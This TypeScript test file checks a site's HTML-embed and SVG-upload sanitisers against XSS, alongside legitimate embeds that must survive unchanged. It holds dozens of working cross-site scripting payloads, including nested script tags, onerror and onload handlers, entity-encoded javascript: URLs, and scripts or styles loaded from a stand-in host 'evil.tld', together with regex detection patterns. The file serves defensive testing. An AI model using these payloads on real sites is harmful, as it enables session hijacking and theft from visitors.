// Attack suite for `stripActiveHtml` — the gate that decides what a
// non-administrator may put in an HTML Embed block.
//
// It exists because the first version was defeated by the oldest trick there
// is: a single-pass `.replace()` over
// `<scr<script></script>ipt>alert(1)</scr<script></script>ipt>` removes the
// inner pairs and lets the outer fragments close up into a working
// `<script>`. An author — the lowest-privilege role — could have pasted that
// and had it served to every visitor, including an administrator whose
// session it would then be running in.
//
// A regex sanitiser only stays correct if someone keeps shooting at it, so the
// shooting lives here. Run with:
//
//     npm run check:xss
//
// Two halves, and both matter: payloads that must be neutralised, and ordinary
// embeds that must come back untouched. A sanitiser that eats legitimate
// iframes is broken too, just less visibly.

import { stripActiveHtml } from "../src/lib/contentPolicy.ts";
import { sanitizeSvg } from "../src/lib/sanitizeSvg.ts";

/** Must not survive. */
const ATTACKS: [string, string][] = [
  ["plain script", "<script>alert(1)</script>"],
  ["unclosed script", "<script src=//evil.tld/x.js>"],
  ["self-closing script", "<script src=//evil.tld/x.js />"],
  ["nested/split script", "<scr<script></script>ipt>alert(document.cookie)</scr<script></script>ipt>"],
  ["nested variant", "<scr<script>ipt>alert(1)</scr<script>ipt>"],
  ["triple nest", "<scr<scr<script></script>ipt></script>ipt>alert(1)</script>"],
  ["img onerror", "<img src=x onerror=alert(1)>"],
  ["img onerror spaced", "<img src=x onerror = alert(1)>"],
  ["backtick handler", "<img src=x onerror=`alert(1)`>"],
  ["svg onload", "<svg onload=alert(1)>"],
  // A `/` or a closing quote starts an attribute as well as a space does.
  ["solidus onerror", "<img/src/onerror=alert(1)>"],
  ["quote-adjacent onerror", '<img src="x"onerror=alert(1)>'],
  ["svg solidus onload", "<svg/onload=alert(1)>"],
  ["iframe solidus js src", '<iframe/src="javascript:alert(1)"></iframe>'],
  ["a solidus js href", "<a/href=javascript:alert(1)>x</a>"],
  ["body ONLOAD upper", "<body ONLOAD=alert(1)>"],
  ["details ontoggle", "<details open ontoggle=alert(1)>"],
  ["href javascript", '<a href="javascript:alert(1)">x</a>'],
  ["href js leading space", '<a href="  javascript:alert(1)">x</a>'],
  ["href js dec entity", '<a href="java&#115;cript:alert(1)">x</a>'],
  ["href js hex entity", '<a href="jav&#x61;script:alert(1)">x</a>'],
  ["href js no semicolon", '<a href="java&#115cript:alert(1)">x</a>'],
  ["href js &Tab;", '<a href="java&Tab;script:alert(1)">x</a>'],
  ["href vbscript", '<a href="vbscript:msgbox(1)">x</a>'],
  ["href data text/html", '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>'],
  ["formaction", '<button formaction="javascript:alert(1)">x</button>'],
  ["iframe srcdoc raw", '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ["iframe srcdoc entities", '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>'],
  ["base tag", '<base href="//evil.tld/">'],
  ["meta refresh", '<meta http-equiv="refresh" content="0;url=//evil.tld">'],
  ["object data", '<object data="javascript:alert(1)"></object>'],
  ["style js url", '<div style="background:url(javascript:alert(1))">x</div>'],
  ["style expression", '<div style="width:expression(alert(1))">x</div>'],
  ["svg animate href", "<svg><a><animate attributeName=href values=javascript:alert(1) /></a></svg>"],
];

/** Must survive byte for byte — these are why the block exists. */
const KEEP: [string, string][] = [
  ["youtube iframe", '<iframe src="https://www.youtube.com/embed/abc" width="560" height="315"></iframe>'],
  ["plain image", '<img src="/uploads/a.webp" alt="a" width="10" height="10">'],
  ["data: image", '<img src="data:image/png;base64,iVBORw0KGgo=" alt="">'],
  ["normal link", '<a href="https://example.com/x?a=1&b=2">link</a>'],
  ["relative link", '<a href="/blog/post">link</a>'],
  ["mailto", '<a href="mailto:a@b.com">mail</a>'],
  ["harmless style", '<div style="color:red;background:url(/img.png)">x</div>'],
  ["form", '<form action="/submit" method="post"><input name="q"></form>'],
  ["table", "<table><tr><td>a</td></tr></table>"],
];

/**
 * The output as a browser would read it: entities decoded, and the tab/CR/LF
 * that the URL parser drops removed. Judging the raw text instead is exactly
 * how the entity-encoded and `&Tab;` payloads above were first scored "safe".
 */
function asBrowserSees(html: string): string {
  return html
    .replace(/&#x([0-9a-f]+);?/gi, (_m, h) => String.fromCodePoint(parseInt(h, 16)))
    .replace(/&#(\d+);?/g, (_m, d) => String.fromCodePoint(parseInt(d, 10)))
    .replace(/&Tab;/gi, "\t")
    .replace(/[\t\n\r]/g, "");
}

const DANGER = /<script|\son[a-z]+\s*=|javascript\s*:|vbscript\s*:|srcdoc|expression\s*\(|<base|<meta/i;

let leaks = 0;
let damaged = 0;

console.log("— must be neutralised —");
for (const [name, payload] of ATTACKS) {
  const out = stripActiveHtml(payload);
  const bad = DANGER.test(asBrowserSees(out));
  if (bad) leaks++;
  console.log(`${bad ? "LEAK " : "ok   "} ${name.padEnd(24)} ${JSON.stringify(out).slice(0, 72)}`);
}

console.log("\n— must be left alone —");
for (const [name, markup] of KEEP) {
  const out = stripActiveHtml(markup);
  const same = out === markup;
  if (!same) damaged++;
  console.log(`${same ? "kept " : "BROKE"} ${name.padEnd(24)} ${same ? "" : JSON.stringify(out).slice(0, 72)}`);
}

/* ── Uploaded SVG ─────────────────────────────────────────────────────────
 *
 * An SVG is a document, not a picture, and it is served from the site's own
 * origin. `sanitizeSvg` is allowlist-based and held up far better than the
 * embed gate did — one payload got through, and it was the same *shape* of
 * mistake: a solidus separates attributes exactly as a space does, so
 * `<rect x="1"/onload=alert(1)/>` carried a live handler past a rule that
 * only looked for whitespace.
 */
const SVG_ATTACKS: [string, string][] = [
  ["script child", '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'],
  ["script in CDATA", "<svg><script><![CDATA[alert(1)]]></script></svg>"],
  ["nested script", "<svg><scr<script></script>ipt>alert(1)</scr<script></script>ipt></svg>"],
  ["onload on root", '<svg onload="alert(1)"></svg>'],
  ["onload unquoted", "<svg onload=alert(1)></svg>"],
  ["ONLOAD uppercase", '<svg ONLOAD="alert(1)"></svg>'],
  ["solidus onload root", "<svg/onload=alert(1)></svg>"],
  ["solidus onload rect", '<svg><rect x="1"/onload=alert(1)/></svg>'],
  ["solidus onload path", '<svg><path d="M0 0"/onload=alert(1)/></svg>'],
  ["double solidus", '<svg><rect x="1"//onload=alert(1)/></svg>'],
  ["solidus then space", '<svg><rect x="1"/ onload=alert(1)/></svg>'],
  ["solidus onerror", '<svg><image href="#a"/onerror=alert(1)/></svg>'],
  ["a href javascript", '<svg><a href="javascript:alert(1)"><text>x</text></a></svg>'],
  ["use external", '<svg><use href="//evil.tld/x.svg#a"/></svg>'],
  ["image external", '<svg><image href="https://evil.tld/track.png"/></svg>'],
  ["xlink javascript", '<svg><image xlink:href="javascript:alert(1)"/></svg>'],
  ["foreignObject", "<svg><foreignObject><body><img src=x onerror=alert(1)></body></foreignObject></svg>"],
  ["animate href", '<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>'],
  ["set onload", '<svg><set attributeName="onload" to="alert(1)"/></svg>'],
  ["handler element", '<svg><handler xmlns:ev="x" ev:event="load">alert(1)</handler></svg>'],
  ["style @import", "<svg><style>@import url(//evil.tld/x.css);</style></svg>"],
  ["style url()", "<svg><style>.a{background:url(//evil.tld/t.png)}</style></svg>"],
  ["style attr url()", '<svg><rect style="fill:url(//evil.tld/x)"/></svg>'],
  ["doctype entity", '<!DOCTYPE svg [<!ENTITY a "aaa">]><svg><text>&a;</text></svg>'],
];

/** Ordinary icons — these must still render. */
const SVG_KEEP: [string, string, RegExp][] = [
  [
    "simple path",
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M1 1h4v4z" fill="#f00"/></svg>',
    /<path [^>]*d="M1 1h4v4z"/,
  ],
  [
    "gradient",
    '<svg><defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient></defs><rect fill="url(#g)" width="4" height="4"/></svg>',
    /<linearGradient id="g">/,
  ],
  [
    "use by id",
    '<svg><defs><path id="p" d="M0 0h1v1z"/></defs><use href="#p"/></svg>',
    /<use href="#p"/,
  ],
];

const SVG_DANGER = /<script|[\s/]on[a-z]+\s*=|javascript:|foreignObject|@import|<animate|<handler|<set\b/i;

console.log("\n— uploaded SVG: must be neutralised —");
for (const [name, payload] of SVG_ATTACKS) {
  const result = sanitizeSvg(payload);
  const bad = result ? SVG_DANGER.test(result.svg) : false;
  if (bad) leaks++;
  const shown = result ? JSON.stringify(result.svg).slice(0, 72) : "(rejected outright)";
  console.log(`${bad ? "LEAK " : "ok   "} ${name.padEnd(24)} ${shown}`);
}

console.log("\n— uploaded SVG: must still render —");
for (const [name, svg, expected] of SVG_KEEP) {
  const result = sanitizeSvg(svg);
  const ok = !!result && expected.test(result.svg);
  if (!ok) damaged++;
  console.log(`${ok ? "kept " : "BROKE"} ${name.padEnd(24)} ${result ? JSON.stringify(result.svg).slice(0, 66) : "(rejected)"}`);
}

console.log(`\n${leaks} leak(s), ${damaged} legitimate file(s) damaged`);
if (leaks || damaged) process.exit(1);
